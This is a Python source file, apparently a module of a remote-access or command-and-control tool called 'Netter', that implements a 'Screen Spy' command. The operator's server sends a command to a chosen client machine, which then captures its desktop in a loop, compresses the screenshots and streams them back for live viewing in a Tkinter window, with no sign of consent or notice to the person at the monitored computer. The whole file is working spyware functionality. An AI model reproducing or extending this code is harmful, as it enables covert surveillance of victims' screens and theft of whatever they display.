import io, time, threading
import time, io

from PIL import ImageGrab, ImageTk, Image
from typing import TYPE_CHECKING
from zlib import compress, decompress
import tkinter as tk

from ..enums import PacketType
from ..commands import CommandBase

from typing import Callable

if TYPE_CHECKING:
    from ..http import NetterServer, NetterClient
    from ..enums import ClientResponse
    from ..client.connect import Connect


class tkinterWindow(tk.Tk):
    WINDOW_WIDHT = 1280
    WINDOW_HEIGHT = 720

    def __init__(self, on_close: Callable):
        super().__init__()

        self.on_close = on_close

        self.title("Screen Spy")
        self.geometry(f"{self.WINDOW_WIDHT}x{self.WINDOW_HEIGHT}")

        self.imageLabel = tk.Label(self)
        self.imageLabel.pack(fill="both", expand=True)

        self.protocol("WM_DELETE_WINDOW", self.on_close)

    def change_image(self, data):
        img = Image.open(data).resize((self.WINDOW_WIDHT, self.WINDOW_HEIGHT))
        frame = ImageTk.PhotoImage(img)

        self.imageLabel.config(image=frame)
        self.imageLabel.image = frame


class screenSpyCommand(CommandBase):
    __aliases__ = ["spy", "screenspy"]
    __description__ = "Take a screenshot from the client desktop"
    __extra__ = "Usage: `screenshot <Client ID>` | The screenshot will be saved to `client` directory"

    isRunning = False
    tkObject = None

    def execute(self, netServer: "NetterServer", *args) -> "NetterClient":
        if self.isRunning:
            netServer.console_log("Screen spying is already running", level="ERROR")
            return

        if not args and not netServer.selectedClient:
            # netServer.console_log('No client selected', level = 'ERROR')
            netServer.inputHandler.handle("help spy")
            return

        selectedClient = netServer.selectedClient if netServer.selectedClient else netServer.get(UUID=args[0])

        if selectedClient is None:
            netServer.console_log("Provided client does not exist.", level="ERROR")
            return

        self.isRunning = True
        selectedClient.socket_.send_(packetType=PacketType.COMMAND, data="screenspy")

        # self.tkObject = tkinterWindow()
        # self.tkObject.mainloop()

        def on_close():
            self.isRunning = False
            selectedClient.socket_.send_(packetType=PacketType.COMMAND, data="spy")  # Trigger once more to stop sending
            self.tkObject.destroy()

        def run_ui():
            self.tkObject = tkinterWindow(on_close=on_close)
            self.tkObject.mainloop()

        threading.Thread(target=run_ui, daemon=True).start()
        return selectedClient

    def on_server_receive(self, netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
        # self.tkObject.change_image(io.BytesIO(decompress(packet.data)))

        if self.tkObject:
            data = io.BytesIO(decompress(packet.data))
            self.tkObject.after(0, self.tkObject.change_image, data)

    def on_client_receive(self, serverHandler: "Connect"):
        self.isRunning = not self.isRunning

        while self.isRunning:
            yield self.capture_screen()

    def capture_screen(self) -> bytes:
        screenshot = ImageGrab.grab()
        screenshot = screenshot.convert("RGB")

        byteArray = io.BytesIO()
        screenshot.save(byteArray, format="JPEG")

        data = compress(byteArray.getvalue())
        return data
